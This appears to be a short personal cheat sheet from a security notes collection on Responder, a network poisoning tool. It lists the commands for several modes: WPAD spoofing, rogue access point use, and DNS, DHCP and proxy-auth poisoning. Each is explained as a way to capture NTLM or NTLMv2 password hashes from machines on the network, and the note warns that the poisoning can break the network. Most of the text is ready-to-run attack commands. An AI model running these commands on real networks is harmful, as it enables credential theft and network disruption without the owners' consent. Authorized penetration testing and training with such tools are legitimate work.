---
Name: Responder
Platform: Linux
tags:
  - Resources
  - infosec
---
GitHub: https://github.com/lgandx/Responder

------

Basics :

```
sudo responder -I <interface>
```

------

Analyze mode:

```
sudo responder -I <interface> -A
```

Analyze mode allows to observe what is going on <mark style="background: #FFB86CA6;">without poisoning anything</mark>.

------

Responder wpad:

```
sudo responder -I <interface> -wF
```

------

Responder on a rogue AP:

```
sudo responder -I <inteface> -dwP -vvv
```

This allows to get NTLM hash when connecting because of the Proxy Auth and poisoning the dns request with wpad.

------

Responder with DNS, DHCP, Proxy Auth, and analyze mode:

```
sudo responder -I <interface> -dDPA
```

This allows to get `NTLMv2` hashes via dns, dhcp, and proxy auth, but it can screw up the network if not done properly.

Example:

```
sudo python3 Responder.py -I enp0s31f6 -dDPA
```

------